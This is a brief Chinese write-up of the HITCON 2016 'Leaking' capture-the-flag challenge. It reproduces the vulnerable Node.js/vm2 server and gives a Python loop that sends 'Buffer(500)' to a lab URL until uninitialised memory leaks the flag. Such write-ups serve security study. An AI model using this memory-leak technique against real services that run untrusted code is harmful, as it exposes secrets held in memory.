# [HITCON 2016]Leaking

## 知识点

`沙箱逃逸`

## 解题

```javascript
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function() {
    console.log("listening on port 3000!");
});
```

解题

```python
import requests
import time

url = 'http://aec15194-fd75-4137-b7ca-09b92683d609.node4.buuoj.cn:81/?data=Buffer(500)'
response = ''
while 'flag' not in response:
    res = requests.get(url)
    time.sleep(0.1)
    if 'flag{' in res.text:
        print(res.text)
        break
```

